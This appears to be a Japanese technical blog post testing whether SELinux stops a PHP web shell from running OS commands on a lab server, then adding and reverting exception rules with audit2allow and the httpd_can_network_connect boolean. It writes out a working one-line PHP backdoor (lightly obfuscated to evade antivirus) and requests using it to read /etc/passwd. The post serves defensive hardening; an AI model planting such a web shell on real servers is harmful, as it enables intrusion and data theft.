---
layout:        post
title:         "SELinuxによるPHPバックドア(WebShell)の<br>OSコマンド実行拒否と例外ルール作成"
date:          2021-10-20
category:      Linux
cover:         /assets/cover6.jpg
redirect_from:
comments:      true
published:     true
latex:         false
photoswipe:    false
# sitemap: false
# feed:    false
---

SELinuxが有効化されている環境でバックドアが期待通りに動作するかを検証しました。
また、バックドアが動くように例外ルールをSELinuxに追加する方法も説明します。

SELinux (Security-Enhanced Linux) は、Linux カーネルにおける MAC の実装です。
プロセスがファイルやディレクトリにアクセス (Read/Write/Exec) するとき、まずはユーザとグループに基づいて制御する任意アクセス制御 (DAC; Discretionary Access Control) をチェックし、その後に**強制アクセス制御** (**MAC**; Mandatory Access Control) をチェックします。DACとMACの両方で許可された場合のみ、アクセスが許可されます。
DACルールでアクセス拒否した場合は、MACルールは使用されません。

### SELinux環境下のPHPバックドア

まず、サーバ側にバックドアを設置します。
注意ですが、以下のコマンドを入力するときは内容から `---` を取り除いてください（Windows DefenderによるTrojan検知を防ぐために入れてます）。
~~~bash
cat <<EOS > /var/www/html/backdoor.php
<?---php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
EOS
~~~

httpdが起動していて、FWで80番ポートが開いていることを確認したら、バックドア経由でコマンドを実行させます。
ブラウザでアクセスしても良いですが、今回はPowerShellを使ってcurlでアクセスします。

~~~powershell
PS> (curl http://192.168.56.102/backdoor.php?cmd=pwd).Content
<pre>/var/www/html
</pre>

PS> (curl http://192.168.56.102/backdoor.php?cmd=cat+/etc/passwd).Content
<pre>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
...(省略)...

PS> (curl http://192.168.56.102/backdoor.php?cmd=curl+example.com).Content
<pre></pre>
~~~

バックドア経由では、コマンド `pwd` と `cat /etc/passwd` は実行成功しましたが、`curl example.com` は失敗しました。

サーバ側で audit ログを確認すると、SELinux で curl コマンドが拒否されたことが確認できます。
~~~bash
~]# tail -f /var/log/audit/audit.log | grep denied
type=AVC msg=audit(0000000000.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
~~~
攻撃者は curl を使って、攻撃者が用意したサイトから権限昇格を実行するためのツールなどを取得させるので、今回はSELinuxでcurlを使ったツールダウンロードを防ぐことができました。



## httpdでcurlを実行できる例外ルールの追加
SELinuxを有効化すると業務に必要なサービスや処理が実行できなくなる場合があるので、例外ルールの追加方法について説明します。まず、SELinuxのトラブルシューティングツールである sealert を使って、SELinuxが拒否したログのレポートを確認します。
~~~bash
~]# sealert -l "*"
~~~
出力結果：
~~~
...(省略)...
SELinux is preventing curl from name_connect access on the tcp_socket port 80.

*****  Plugin catchall_boolean (24.7 confidence) suggests   ******************

If you want to allow httpd to can network connect
Then you must tell SELinux about this by enabling the 'httpd_can_network_connect' boolean.

Do
setsebool -P httpd_can_network_connect 1

...(省略)...

*****  Plugin catchall (3.53 confidence) suggests   **************************

If you believe that curl should be allowed name_connect access on the port 80 tcp_socket by default.
Then you should report this as a bug.
You can generate a local policy module to allow this access.
Do
allow this access for now by executing:
# ausearch -c 'curl' --raw | audit2allow -M my-curl
# semodule -X 300 -i my-curl.pp


Additional Information:
Source Context                system_u:system_r:httpd_t:s0
Target Context                system_u:object_r:http_port_t:s0
Target Objects                port 80 [ tcp_socket ]
Source                        curl
Source Path                   curl
Port                          80
Host                          localhost.localdomain
Source RPM Packages
Target RPM Packages
SELinux Policy RPM            selinux-policy-targeted-3.14.3-67.el8_4.2.noarch
Local Policy RPM              selinux-policy-targeted-3.14.3-67.el8_4.2.noarch
Selinux Enabled               True
Policy Type                   targeted
Enforcing Mode                Enforcing
Host Name                     localhost.localdomain
Platform                      Linux localhost.localdomain
                              4.18.0-305.19.1.el8_4.x86_64 #1 SMP Wed Sep 15
                              19:39:39 UTC 2021 x86_64 x86_64
Alert Count                   6
First Seen                    2021-10-20 11:52:58 JST
Last Seen                     2021-10-20 14:19:44 JST
Local ID                      ccddc712-ce2a-4215-a99f-8b4c37d9e9bb

Raw Audit Messages
type=AVC msg=audit(0000000000.461:493): avc:  denied  { name_connect } for  pid=4431 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
~~~

例外ルールの追加方法は2つあります。
1つ目はルールを自分で作成してシステムポリシーモジュールに登録する方法で、2つ目はブール値のon/offを設定する方法です。

### 方法1. カスタムポリシーモジュールを作成して登録する

上記のsealertの出力レポート結果の中に「allow this access for now by executing:」から始まる説明とコマンドの実行例が書かれてあります。
このコマンドを実行すると、すぐにSELinuxに例外ルールを追加できます。
~~~
allow this access for now by executing:
# ausearch -c 'curl' --raw | audit2allow -M my-curl
# semodule -X 300 -i my-curl.pp
~~~
今回は、ausearchでauditログを抽出する代わりに、出力結果の下部に表示されたauditログ（Raw Audit Messages）を抽出して使います。
抽出したauditログ(SELinuxによる拒否ログ)を audit2allow コマンドに入力することで、SELinuxで許可するためのポリシーモジュールを生成してくれます。
出力結果では、タイプ httpd_t が http_port_t:tcp_socket (TCPのソケットを開く権限) を許可していることがわかります。
~~~bash
~]# echo 'type=AVC msg=audit(0000000000.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0' | audit2allow

#============= httpd_t ==============

#!!!! This avc can be allowed using one of the these booleans:
#     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled
allow httpd_t http_port_t:tcp_socket name_connect;
~~~
カスタムポリシーモジュールとして良さそうなので、my-curl というファイル名で保存します。
保存したカスタムポリシーモジュールを優先度300でSELinuxに登録して、システムポリシーモジュールの一覧に登録されたことを確認します。
~~~bash
~]# echo 'type=AVC msg=audit(0000000000.612:355): avc:  denied  { name_connect } for  pid=3297 comm="curl" dest=80 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0' | audit2allow -M my-curl
~]# semodule -X 300 -i my-curl.pp
~]# semodule --list-modules=full | grep my-curl -3
300 my-curl           pp
200 container         pp
100 abrt              pp
100 accountsd         pp
~~~
例外ルールが追加できたら、再びPowerShellのcurlでアクセスしてみます。
~~~powershell
PS> (curl http://192.168.56.102/backdoor.php?cmd=curl+example.com).Content
<pre><!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
...(省略)...
~~~
結果、バックドア経由で `curl example.com` が実行され、その結果がWebページに埋め込まれて表示されました。
よって、SELinuxでhttpdがcurlコマンドを実行できる（ネットワーク通信できる）ルールを追加することができました。

検証完了したので、最後に、登録したシステムポリシーモジュールを無効化します。
~~~bash
~]# semodule -d my-curl
~~~

無効化後は curl が失敗するようになります。
~~~powershell
PS> (curl http://192.168.56.102/backdoor.php?cmd=curl+example.com).Content
<pre></pre>
~~~


### 方法2. httpd_can_network_connectブール値をonにする

例外ルールを追加するには、sealertの出力レポート内の「If you want to allow A do B」に従って提案されたフラグをonに設定することで、SELinuxで許可するような例外ルールを設定します。
レポートで以下のように提案がある場合は、ブール値「httpd_can_network_connect」を1に設定すれば良いことがわかります。
~~~
*****  Plugin catchall_boolean (24.7 confidence) suggests   ******************

If you want to allow httpd to can network connect
Then you must tell SELinux about this by enabling the 'httpd_can_network_connect' boolean.

Do
setsebool -P httpd_can_network_connect 1
~~~
ブール値「httpd_can_network_connect」を1に設定します。オプション -P は設定を永続化 (permanent) するためのものです。
~~~bash
~]# setsebool -P httpd_can_network_connect 1
~]# getsebool httpd_can_network_connect
httpd_can_network_connect --> on
~~~

例外ルールを許可したら、クライアント側でバックドア経由でcurlコマンドを実行できるようになります。
~~~powershell
PS> (curl http://192.168.56.102/backdoor.php?cmd=curl+example.com).Content
<pre><!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
...(省略)...
~~~
検証完了したので、ブール値「httpd_can_network_connect」を0に戻します。
~~~bash
~]# setsebool -P httpd_can_network_connect 0
~]# getsebool httpd_can_network_connect
httpd_can_network_connect --> off
~~~
クライアント側で確認すると、バックドア経由でcurlコマンドを実行できなくなります。
~~~powershell
PS> (curl http://192.168.56.102/backdoor.php?cmd=curl+example.com).Content
<pre></pre>
~~~

今回はブール値「httpd_can_network_connect」でhttpdのネットワーク通信を許可しましたが、DB接続に関するネットワーク通信だけ許可する場合は「httpd_can_network_connect_db」というブール値もあります。
ブール値の一覧は以下のコマンドで確認できます。
~~~bash
~]# semanage boolean -l
~~~
httpdに関するブール値を確認したい場合は grep で httpd に関するもののみ抽出します。
~~~bash
~]# semanage boolean -l | grep httpd
httpd_anon_write               (off  ,  off)  Allow httpd to anon write
httpd_builtin_scripting        (on   ,   on)  Allow httpd to builtin scripting
httpd_can_check_spam           (off  ,  off)  Allow httpd to can check spam
httpd_can_connect_ftp          (off  ,  off)  Allow httpd to can connect ftp
httpd_can_connect_ldap         (off  ,  off)  Allow httpd to can connect ldap
httpd_can_connect_mythtv       (off  ,  off)  Allow httpd to can connect mythtv
httpd_can_connect_zabbix       (off  ,  off)  Allow httpd to can connect zabbix
httpd_can_network_connect      (off  ,  off)  Allow httpd to can network connect
httpd_can_network_connect_cobbler (off  ,  off)  Allow httpd to can network connect cobbler
httpd_can_network_connect_db   (off  ,  off)  Allow httpd to can network connect db
httpd_can_network_memcache     (off  ,  off)  Allow httpd to can network memcache
httpd_can_network_relay        (off  ,  off)  Allow httpd to can network relay
httpd_can_sendmail             (off  ,  off)  Allow httpd to can sendmail
httpd_dbus_avahi               (off  ,  off)  Allow httpd to dbus avahi
httpd_dbus_sssd                (off  ,  off)  Allow httpd to dbus sssd
httpd_dontaudit_search_dirs    (off  ,  off)  Allow httpd to dontaudit search dirs
httpd_enable_cgi               (on   ,   on)  Allow httpd to enable cgi
httpd_enable_ftp_server        (off  ,  off)  Allow httpd to enable ftp server
httpd_enable_homedirs          (off  ,  off)  Allow httpd to enable homedirs
httpd_execmem                  (off  ,  off)  Allow httpd to execmem
httpd_graceful_shutdown        (off  ,  off)  Allow httpd to graceful shutdown
httpd_manage_ipa               (off  ,  off)  Allow httpd to manage ipa
httpd_mod_auth_ntlm_winbind    (off  ,  off)  Allow httpd to mod auth ntlm winbind
httpd_mod_auth_pam             (off  ,  off)  Allow httpd to mod auth pam
httpd_read_user_content        (off  ,  off)  Allow httpd to read user content
httpd_run_ipa                  (off  ,  off)  Allow httpd to run ipa
httpd_run_preupgrade           (off  ,  off)  Allow httpd to run preupgrade
httpd_run_stickshift           (off  ,  off)  Allow httpd to run stickshift
httpd_serve_cobbler_files      (off  ,  off)  Allow httpd to serve cobbler files
httpd_setrlimit                (off  ,  off)  Allow httpd to setrlimit
httpd_ssi_exec                 (off  ,  off)  Allow httpd to ssi exec
httpd_sys_script_anon_write    (off  ,  off)  Allow httpd to sys script anon write
httpd_tmp_exec                 (off  ,  off)  Allow httpd to tmp exec
httpd_tty_comm                 (off  ,  off)  Allow httpd to tty comm
httpd_unified                  (off  ,  off)  Allow httpd to unified
httpd_use_cifs                 (off  ,  off)  Allow httpd to use cifs
httpd_use_fusefs               (off  ,  off)  Allow httpd to use fusefs
httpd_use_gpg                  (off  ,  off)  Allow httpd to use gpg
httpd_use_nfs                  (off  ,  off)  Allow httpd to use nfs
httpd_use_opencryptoki         (off  ,  off)  Allow httpd to use opencryptoki
httpd_use_openstack            (off  ,  off)  Allow httpd to use openstack
httpd_use_sasl                 (off  ,  off)  Allow httpd to use sasl
httpd_verify_dns               (off  ,  off)  Allow httpd to verify dns
~~~

### まとめ

SELinuxを使うことで、例えDACでアクセスや実行が許可されていても、MACでアクセス拒否することが可能になるため、バックドアを配置しても探索や権限昇格に使用するためのコマンドが期待通りに使用できないことから、侵入後の影響範囲を小さくできます。
また、SELinuxを実環境の運用に合わせるために、例外ルールの作成や、事前に用意されているブール値を設定することで、柔軟にSELinuxポリシールールを変更することもできます。
SELinuxは面倒だからと言って、とりあえず無効化するのではなく、有効化もしくはPassiveモード（MACの拒否をログに残すがアクセスは許可するモード）で運用しましょう。

以上です。


### 参考文献

- [SELinux ユーザーおよび管理者のガイド Red Hat Enterprise Linux 7 \| Red Hat Customer Portal](https://access.redhat.com/documentation/ja-jp/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/index)
- [とほほのSELinux入門 - とほほのWWW入門](https://www.tohoho-web.com/ex/selinux.html)
